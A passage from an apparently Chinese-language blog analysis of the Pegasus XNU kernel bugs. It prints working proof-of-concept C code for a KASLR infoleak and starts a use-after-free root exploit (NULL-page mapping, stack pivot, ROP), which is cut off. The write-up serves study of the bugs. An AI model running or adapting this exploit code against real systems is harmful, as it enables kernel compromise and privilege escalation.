class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">uint64_t</span> kslide_infoleak(<span class="keyword">void</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">kern_return_t</span> kr = <span class="number">0</span>, err = <span class="number">0</span>;</div><div class="line">    <span class="keyword">mach_port_t</span> res = MACH_PORT_NULL, master = MACH_PORT_NULL;</div><div class="line"></div><div class="line">    <span class="keyword">io_service_t</span> serv = <span class="number">0</span>;</div><div class="line">    <span class="keyword">io_connect_t</span> conn = <span class="number">0</span>;</div><div class="line">    <span class="keyword">io_iterator_t</span> iter = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">uint64_t</span> kslide = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">void</span> *dict = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">512</span>);</div><div class="line">    <span class="keyword">uint32_t</span> idx = <span class="number">0</span>; <span class="comment">// index into our data</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_IN(dict, data) do &#123; *(uint32_t *)(dict + idx) = (data); idx += 4; &#125; while (0)</span></div><div class="line"></div><div class="line">    WRITE_IN(dict, (<span class="number">0x000000d3</span>)); <span class="comment">// signature, always at the beginning</span></div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | <span class="number">2</span>)); <span class="comment">// dictionary with two entries</span></div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeSymbol | <span class="number">4</span>)); <span class="comment">// key with symbol, 3 chars + NUL byte</span></div><div class="line">    WRITE_IN(dict, (<span class="number">0x00414141</span>)); <span class="comment">// 'AAA' key + NUL byte in little-endian</span></div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | <span class="number">0x200</span>)); <span class="comment">// value with big-size number</span></div><div class="line">    WRITE_IN(dict, (<span class="number">0x41414141</span>)); WRITE_IN(dict, (<span class="number">0x41414141</span>)); <span class="comment">// at least 8 bytes for our big numbe</span></div><div class="line"></div><div class="line">    host_get_io_master(mach_host_self(), &amp;master); <span class="comment">// get iokit master port</span></div><div class="line"></div><div class="line">    kr = io_service_get_matching_services_bin(master, (<span class="keyword">char</span> *)dict, idx, &amp;res);</div><div class="line">    <span class="keyword">if</span> (kr == KERN_SUCCESS) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"(+) Dictionary is valid! Spawning user client...\n"</span>);</div><div class="line">    &#125; <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line"></div><div class="line">    serv = IOServiceGetMatchingService(master, IOServiceMatching(<span class="string">"IOHDIXController"</span>));</div><div class="line"></div><div class="line">    kr = io_service_open_extended(serv, mach_task_self(), <span class="number">0</span>, NDR_record, (<span class="keyword">io_buf_ptr_t</span>)dict, idx, &amp;err, &amp;conn);</div><div class="line">    <span class="keyword">if</span> (kr == KERN_SUCCESS) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"(+) UC successfully spawned! Leaking bytes...\n"</span>);</div><div class="line">    &#125; <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line"></div><div class="line">    IORegistryEntryCreateIterator(serv, <span class="string">"IOService"</span>, kIORegistryIterateRecursively, &amp;iter);</div><div class="line">    <span class="keyword">io_object_t</span> object = IOIteratorNext(iter);</div><div class="line"></div><div class="line">    <span class="keyword">char</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span> bufCnt = <span class="number">0x200</span>;</div><div class="line"></div><div class="line">    kr = io_registry_entry_get_property_bytes(object, <span class="string">"AAA"</span>, (<span class="keyword">char</span> *)&amp;buf, &amp;bufCnt);</div><div class="line">    <span class="keyword">if</span> (kr == KERN_SUCCESS) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"(+) Done! Calculating KASLR slide...\n"</span>);</div><div class="line">    &#125; <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> k = <span class="number">0</span>; k &lt; <span class="number">128</span>; k += <span class="number">8</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%#llx\n"</span>, *(<span class="keyword">uint64_t</span> *)(buf + k));</div><div class="line">    &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">    <span class="keyword">uint64_t</span> hardcoded_ret_addr = <span class="number">0xffffff80003934bf</span>;</div><div class="line"></div><div class="line">    kslide = (*(<span class="keyword">uint64_t</span> *)(buf + (<span class="number">7</span> * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)))) - hardcoded_ret_addr;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"(i) KASLR slide is %#016llx\n"</span>, kslide);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> kslide;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="构造字典"><a href="#构造字典" class="headerlink" title="构造字典"></a>构造字典</h4><p>看下面这段代码</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">void *dict = calloc<span class="comment">(1, 512)</span>;</div><div class="line">ui<span class="symbol">nt32</span>_t idx = <span class="number">0</span>; <span class="comment">// index into our data</span></div><div class="line"></div><div class="line"><span class="attr">#define WRITE_IN(dict, data) do &#123; *(uint32</span>_t *)<span class="comment">(dict + idx)</span> = <span class="comment">(data)</span>; idx += <span class="number">4</span>; &#125; <span class="keyword">while</span> <span class="comment">(0)</span></div></pre></td></tr></table></figure><p>这里的<code>WRITE_IN</code>这个宏只是为了方便我们将数据填入内存之中  </p><p>xml的字典格式  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">symbol</span>&gt;</span>AAA<span class="tag">&lt;/<span class="name">symbol</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">number</span> <span class="attr">size</span>=<span class="string">0x200</span>&gt;</span>0x4141414141414141<span class="tag">&lt;/<span class="name">number</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div></pre></td></tr></table></figure><p>对应的代码  </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">WRITE_IN(<span class="name">dict</span>, (<span class="number">0</span>x000000d3))<span class="comment">; // 头部签名</span></div><div class="line"></div><div class="line">WRITE_IN(<span class="name">dict</span>, (<span class="name">kOSSerializeEndCollection</span> | kOSSerializeDictionary | <span class="number">2</span>))<span class="comment">; // 包含两个元素的字典</span></div><div class="line"></div><div class="line">WRITE_IN(<span class="name">dict</span>, (<span class="name">kOSSerializeSymbol</span> | 4)); // 长度为3的symbol</div><div class="line">WRITE_IN(dict, (0x00414141)); // 'AAA' key键</div><div class="line"></div><div class="line">WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | <span class="number">0</span>x200))<span class="comment">; //0x200大小的number</span></div><div class="line">WRITE_IN(<span class="name">dict</span>, (<span class="number">0</span>x41414141))<span class="comment">; WRITE_IN(dict, (0x41414141)); //实际8字节的number</span></div></pre></td></tr></table></figure><p>利用<code>io_service_get_matching_services_bin</code>测试我们的<code>dic</code>是否有效  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">host_get_io_master(mach_host_self(), &amp;master); <span class="comment">// get iokit master port</span></div><div class="line"></div><div class="line">kr = io_service_get_matching_services_bin(master, (<span class="keyword">char</span> *)dict, idx, &amp;res);</div><div class="line"><span class="keyword">if</span> (kr == KERN_SUCCESS) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"(+) Dictionary is valid! Spawning user client...\n"</span>);</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div></pre></td></tr></table></figure><p>若<code>kr == KERN_SUCCESS</code>则我们的<code>dic</code>则为有效</p><h4 id="生成UserClient设定属性"><a href="#生成UserClient设定属性" class="headerlink" title="生成UserClient设定属性"></a>生成UserClient设定属性</h4><p>我们需要一个<code>UserClient</code>用来和内核通信，所以使用<code>io_service_open_extended</code>来产生一个相关服务的<code>UserClient</code>，这里的服务并不重要  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">serv = IOServiceGetMatchingService(master, IOServiceMatching(<span class="string">"IOHDIXController"</span>));</div><div class="line"></div><div class="line">kr = io_service_open_extended(serv, mach_task_self(), <span class="number">0</span>, NDR_record, (<span class="keyword">io_buf_ptr_t</span>)dict, idx, &amp;err, &amp;conn);</div><div class="line"><span class="keyword">if</span> (kr == KERN_SUCCESS) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"(+) UC successfully spawned! Leaking bytes...\n"</span>);</div><div class="line">&#125; <span class="keyword">else</span></div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div></pre></td></tr></table></figure><p>首先我们通过<code>IOServiceGetMatchingService</code>去从<code>IORegistry</code>里匹配一个特定服务，然后通过<code>io_service_open_extended</code>让可以设置其属性并打开一个服务即隐式产生<code>UserClient</code><br>接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代<code>IORegistry</code>找到刚刚创建的<code>UserClient</code>。  </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">IORegistryEntryCreateIterator(<span class="name">serv</span>, <span class="string">"IOService"</span>, kIORegistryIterateRecursively, <span class="symbol">&amp;iter</span>)<span class="comment">;</span></div><div class="line">io_object_t object = IOIteratorNext(<span class="name">iter</span>)<span class="comment">;</span></div></pre></td></tr></table></figure><p>先通过<code>serv</code>端口创建<code>io_iterator_t</code>，我们的<code>UserClient</code>在<code>serv</code>创建之后，所以拿到<code>iter</code>后迭代一次即为我们的<code>UserClient</code>，现在就可以读取其属性并触发info-leak。</p><h4 id="读取属性，触发info-leak"><a href="#读取属性，触发info-leak" class="headerlink" title="读取属性，触发info-leak"></a>读取属性，触发info-leak</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">char <span class="keyword">buf[0x200] </span>= &#123;<span class="number">0</span>&#125;<span class="comment">;</span></div><div class="line">mach_msg_type_number_t <span class="keyword">bufCnt </span>= <span class="number">0x200</span><span class="comment">;</span></div><div class="line"></div><div class="line">kr = io_registry_entry_get_property_bytes(object, <span class="string">"AAA"</span>, (char *)&amp;<span class="keyword">buf, </span>&amp;<span class="keyword">bufCnt);</span></div><div class="line">if (kr == KERN_SUCCESS) &#123;</div><div class="line">    printf(<span class="string">"(+) Done! Calculating KASLR slide...\n"</span>)<span class="comment">;</span></div><div class="line">&#125; else</div><div class="line">    return -<span class="number">1</span><span class="comment">;</span></div></pre></td></tr></table></figure><p>通过<code>io_registry_entry_get_property_bytes</code>我们可以获取到原始字节，存在<code>buf</code>中，我们打印其值  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">uint32_t</span> k = <span class="number">0</span>; k &lt; <span class="number">128</span>; k += <span class="number">8</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%#llx\n"</span>, *(<span class="keyword">uint64_t</span> *)(buf + k));</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>对应输出：  </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x4141414141414141</span>  <span class="comment">// 有效的number</span></div><div class="line"><span class="number">0xffffff8033c66284</span>  <span class="comment">//</span></div><div class="line"><span class="number">0xffffff8035b5d800</span>  <span class="comment">//</span></div><div class="line"><span class="number">0x4</span>                 <span class="comment">// 其他数据或返回地址</span></div><div class="line"><span class="number">0xffffff803506d5a0</span>  <span class="comment">//</span></div><div class="line"><span class="number">0xffffff8033c662b4</span>  <span class="comment">//</span></div><div class="line"><span class="number">0xffffff818d2b3e30</span>  <span class="comment">//</span></div><div class="line"><span class="number">0xffffff80037934bf</span>  <span class="comment">// 函数返回地址</span></div><div class="line">...</div></pre></td></tr></table></figure><p>我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数<br>这里实际读取的代码位于<code>is_io_registry_entry_get_property_bytes</code>函数，即<code>io_registry_entry_get_property_bytes</code>调用了 <code>is_io_registry_entry_get_property_bytes</code>。</p><p><code>is_io_registry_entry_get_property_bytes</code>源代码</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Routine io_registry_entry_get_property */</span></div><div class="line"><span class="symbol">kern_return_t</span> is_io_registry_entry_get_property_bytes(</div><div class="line">io_object_t registry_entry,</div><div class="line">io_name_t property_name,</div><div class="line">io_struct_inband_t <span class="keyword">buf,</span></div><div class="line">mach_msg_type_number_t *dataCnt )</div><div class="line">&#123;</div><div class="line">    OSObject*obj<span class="comment">;</span></div><div class="line">    OSData *<span class="meta">data</span><span class="comment">;</span></div><div class="line">    OSString *<span class="keyword">str;</span></div><div class="line">    OSBoolean*<span class="keyword">boo;</span></div><div class="line">    OSNumber *off<span class="comment">;</span></div><div class="line">    UInt64offsetBytes<span class="comment">;</span></div><div class="line">    unsigned intlen = <span class="number">0</span><span class="comment">;</span></div><div class="line">    const void *<span class="keyword">bytes </span>= <span class="number">0</span><span class="comment">;</span></div><div class="line">    IOReturnret = kIOReturnSuccess<span class="comment">;</span></div><div class="line"></div><div class="line">    CHECK( IORegistryEntry, registry_entry, <span class="meta">entry</span> )<span class="comment">;</span></div><div class="line"></div><div class="line"><span class="symbol">#if</span> CONFIG_MACF</div><div class="line">    <span class="meta">if</span> (<span class="number">0</span> != mac_iokit_check_get_property(kauth_cred_get(), <span class="meta">entry</span>, property_name))</div><div class="line">        return kIOReturnNotPermitted<span class="comment">;</span></div><div class="line"><span class="symbol">#endif</span></div><div class="line"></div><div class="line">    obj = <span class="meta">entry</span>-&gt;copyProperty(property_name)<span class="comment">;</span></div><div class="line">    <span class="meta">if</span>( !obj)</div><div class="line">        return( kIOReturnNoResources )<span class="comment">;</span></div><div class="line"></div><div class="line">    // One day OSData will <span class="keyword">be </span>a <span class="meta">common</span> container <span class="keyword">base </span>class</div><div class="line">    // until then...</div><div class="line">    <span class="meta">if</span>( (<span class="meta">data</span> = OSDynamicCast( OSData, obj ))) &#123;</div><div class="line">len = <span class="meta">data</span>-&gt;getLength()<span class="comment">;</span></div><div class="line"><span class="keyword">bytes </span>= <span class="meta">data</span>-&gt;getBytesNoCopy()<span class="comment">;</span></div><div class="line"></div><div class="line">    &#125; <span class="meta">else</span> <span class="meta">if</span>( (<span class="keyword">str </span>= OSDynamicCast( OSString, obj ))) &#123;</div><div class="line">len = <span class="keyword">str-&gt;getLength() </span>+ <span class="number">1</span><span class="comment">;</span></div><div class="line"><span class="keyword">bytes </span>= <span class="keyword">str-&gt;getCStringNoCopy();</span></div><div class="line"></div><div class="line">    &#125; <span class="meta">else</span> <span class="meta">if</span>( (<span class="keyword">boo </span>= OSDynamicCast( OSBoolean, obj ))) &#123;</div><div class="line">len = <span class="keyword">boo-&gt;isTrue() </span>? sizeof(<span class="string">"Yes"</span>) : sizeof(<span class="string">"No"</span>)<span class="comment">;</span></div><div class="line"><span class="keyword">bytes </span>= <span class="keyword">boo-&gt;isTrue() </span>? <span class="string">"Yes"</span> : <span class="string">"No"</span><span class="comment">;</span></div><div class="line"></div><div class="line">    &#125; <span class="meta">else</span> <span class="meta">if</span>( (off = OSDynamicCast( OSNumber, obj ))) &#123;    <span class="comment">/* j: reading an OSNumber */</span></div><div class="line">offsetBytes = off-&gt;unsigned64BitValue()<span class="comment">;</span></div><div class="line">len = off-&gt;numberOfBytes()<span class="comment">;</span></div><div class="line"><span class="keyword">bytes </span>= &amp;offsetBytes<span class="comment">;</span></div><div class="line"><span class="symbol">#ifdef</span> __BIG_ENDIAN__</div><div class="line"><span class="keyword">bytes </span>= (const void *)</div><div class="line">(((UInt32) <span class="keyword">bytes) </span>+ (sizeof( UInt64) - len))<span class="comment">;</span></div><div class="line"><span class="symbol">#endif</span></div><div class="line"></div><div class="line">    &#125; <span class="meta">else</span></div><div class="line">ret = kIOReturnBadArgument<span class="comment">;</span></div><div class="line"></div><div class="line">    <span class="meta">if</span>( <span class="keyword">bytes) </span>&#123;</div><div class="line"><span class="meta">if</span>( *dataCnt &lt; len)</div><div class="line">    ret = kIOReturnIPCError<span class="comment">;</span></div><div class="line"><span class="meta">else</span> &#123;</div><div class="line">            *dataCnt = len<span class="comment">;</span></div><div class="line">            <span class="keyword">bcopy( </span><span class="keyword">bytes, </span><span class="keyword">buf, </span>len )<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">    &#125;</div><div class="line">    obj-&gt;release()<span class="comment">;</span></div><div class="line"></div><div class="line">    return( ret )<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>下面代码表示正在读取<code>OSNumber</code>，</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">else <span class="keyword">if</span>( (off = OSDynamicCast( OSNumber, obj ))) &#123;</div><div class="line">offsetBytes = off-&gt;unsigned64BitValue(); <span class="comment">/* j: the offsetBytes variable is allocated on the stack */</span></div><div class="line">len = off-&gt;numberOfBytes(); <span class="comment">/* j: this reads out our malformed length, 0x200 */</span></div><div class="line">bytes = &amp;offsetBytes; <span class="comment">/* j: bytes* ptr points to a stack variable */</span></div><div class="line"></div><div class="line">    ...</div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure><p>然后</p><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>( bytes) &#123;</div><div class="line">    <span class="keyword">if</span>( *dataCnt &lt; <span class="built_in">len</span>)</div><div class="line">        ret = kIOReturnIPCError;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        *dataCnt = <span class="built_in">len</span>;</div><div class="line">        bcopy( bytes, buf, <span class="built_in">len</span> ); <span class="comment">/* j: this leaks data from the stack */</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>执行<code>bcopy</code>时，从<code>bytes</code>里读取了错误的长度，指向堆栈变量，泄漏函数返回地址，我们只需要找到一个地址减去静态地址，那么就能计算出内核偏移值</p><h4 id="计算内核偏移"><a href="#计算内核偏移" class="headerlink" title="计算内核偏移"></a>计算内核偏移</h4><p>将<code>/System/Library/Kernels/kernel</code>拖入hopper，搜索<code>is_io_registry_entry_get_property_bytes</code>，如下图  </p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/pic/0-0.png?raw=true" alt="0-0"></p><p>然后通过Xref找到调用的下一条地址即返回地址，最后将之前偏移后的地址-静态地址就等到了内核偏移值</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">0xffffff80037934bf</span> - <span class="number">0xffffff80003934bf</span> = <span class="number">0x3400000</span></div></pre></td></tr></table></figure><p>也就是下面这段代码所示：  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">uint64_t</span> hardcoded_ret_addr = <span class="number">0xffffff80003934bf</span>;</div><div class="line"></div><div class="line">kslide = (*(<span class="keyword">uint64_t</span> *)(buf + (<span class="number">7</span> * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)))) - hardcoded_ret_addr;</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"(i) KASLR slide is %#016llx\n"</span>, kslide);</div></pre></td></tr></table></figure><p>现在获取到了内核偏移值就可以利用UAF漏洞执行ROP链然后提权root。here we go！</p><h3 id="CVE-2016-4656-UAF漏洞利用"><a href="#CVE-2016-4656-UAF漏洞利用" class="headerlink" title="CVE-2016-4656-UAF漏洞利用"></a>CVE-2016-4656-UAF漏洞利用</h3><p>XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步<a href="https://null-me.github.io/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/" target="_blank" rel="external">深入理解Linux堆分配器-DLMalloc</a>这篇分析。<br>那么下面要做的就是如何构造下一个分配的对象，这里我们用<code>OSData</code>因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次<code>o-&gt;retain</code>引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步<a href="https://null-me.github.io/2017/03/07/C++%20Virtual%20table/%E8%AF%A6%E8%A7%A3virtual%20table/" target="_blank" rel="external">详解virtual table</a>简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。<br>下面看我们的步骤：  </p><ul><li>制作一个二进制字典，释放<code>OSString</code>并重新分配<code>OSData</code>。</li><li>Map NULL</li><li>放置stack pivot在偏移0x20到NULL页面</li><li>将一个小的传输链0x0放置在NULL页面中（这将传递执行到主链）</li><li>触发漏洞</li><li>提升权限，生成shell</li></ul><p>下面看完整的Poc代码：  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">use_after_free</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">kern_return_t</span> kr = <span class="number">0</span>;</div><div class="line">    <span class="keyword">mach_port_t</span> res = MACH_PORT_NULL, master = MACH_PORT_NULL;</div><div class="line"></div><div class="line">    <span class="comment">/* craft the dictionary */</span></div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"(i) Crafting dictionary...\n"</span>);</div><div class="line"></div><div class="line">    <span class="keyword">void</span> *dict = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">512</span>);</div><div class="line">    <span class="keyword">uint32_t</span> idx = <span class="number">0</span>; <span class="comment">// index into our data</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_IN(dict, data) do &#123; *(uint32_t *)(dict + idx) = (data); idx += 4; &#125; while (0)</span></div><div class="line"></div><div class="line">    WRITE_IN(dict, (<span class="number">0x000000d3</span>)); <span class="comment">// signature, always at the beginning</span></div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | <span class="number">6</span>)); <span class="comment">// dict with 6 entries</span></div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeString | <span class="number">4</span>));   <span class="comment">// string 'AAA', will get freed</span></div><div class="line">    WRITE_IN(dict, (<span class="number">0x00414141</span>));</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeBoolean | <span class="number">1</span>));  <span class="comment">// bool, true</span></div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeSymbol | <span class="number">4</span>));   <span class="comment">// symbol 'BBB'</span></div><div class="line">    WRITE_IN(dict, (<span class="number">0x00424242</span>));</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeData | <span class="number">32</span>));    <span class="comment">// data (0x00 * 32)</span></div><div class="line">    WRITE_IN(dict, (<span class="number">0x00000000</span>));</div><div class="line">    WRITE_IN(dict, (<span class="number">0x00000000</span>));</div><div class="line">    WRITE_IN(dict, (<span class="number">0x00000000</span>));</div><div class="line">    WRITE_IN(dict, (<span class="number">0x00000000</span>));</div><div class="line">    WRITE_IN(dict, (<span class="number">0x00000000</span>));</div><div class="line">    WRITE_IN(dict, (<span class="number">0x00000000</span>));</div><div class="line">    WRITE_IN(dict, (<span 